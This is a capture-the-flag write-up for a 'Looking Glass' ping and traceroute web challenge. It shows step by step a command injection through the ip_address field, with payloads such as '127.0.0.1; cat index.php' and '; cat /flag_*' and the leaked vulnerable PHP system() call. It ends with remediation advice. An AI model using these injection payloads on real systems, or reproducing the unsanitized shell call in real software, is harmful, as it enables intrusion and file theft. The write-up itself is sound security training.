Challenge 013E00A1 Looking Glass
Target IP: 94.237.57.65:41913

Step 1: Web Application Discovery

Went to [http://94.237.57.65:41913/] and a interface titled Looking Glass appeared. It is designed to run network diagnostics.

<img width="468" height="277" alt="image" src="https://github.com/user-attachments/assets/caca6c36-49cd-4be9-a640-65d8e5c23546" />

I tested out ping via the UI. Pinging 10.10.14.32 and 10.30.18.180. Everything worked as normal.

Inspected the HTML source code. It confirmed that the interactions submitted an HTML form via POST with fields: test, server, ip_address, and submit.

<img width="468" height="273" alt="image" src="https://github.com/user-attachments/assets/d47a99df-44e5-4dd0-a912-267a606eff93" />

Step 2: Traffic Interception

I routed requests through Burp Suite and sent out POST /request to repeater.

POST / HTTP/1.1
Host: 94.237.57.65:41913
Content-Type: application/x-www-form-urlencoded

test=ping&ip_address=10.30.18.180&submit=Test


Tested for command chaining in ip_address using a semicolon.

test=ping&ip_address=127.0.0.1; cat index.php&submit=Test

The response executed both the ping and cat index.php command. Which leaked the PHP source code. 

function runTest($test, $ip_address) {
    if ($test === 'ping') {
        system("ping -c 4 " . $ip_address);
    }
    if ($test === 'traceroute') {
        system("traceroute " . $ip_address);
    }
}

<img width="468" height="296" alt="image" src="https://github.com/user-attachments/assets/6b6d87a0-8550-4e83-a97d-c38d6e3d8fcd" />

Step 3: Flag Retrieval

Ran ls ../ via command injection to find root filesystem

test=ping&ip_address=127.0.0.1; ls ../&submit=Test

There I was able to find the flag. 

test=ping&ip_address=127.0.0.1; cat /flag_*&submit=Test

<img width="1756" height="1092" alt="image" src="https://github.com/user-attachments/assets/254467bd-2b60-44db-bf1a-585a6abb4ca0" />

Remediation

Ways to mitigate this from happening in the future again is through web application firewalls, least privilege principle, avoiding direct system calls, and input validation and sanitization. Never directly pass user input into system shell commands. Run the web application with minimum privileges required to operate. With a web application firewall it can detect and block malicious payloads in which this case would be command injections.
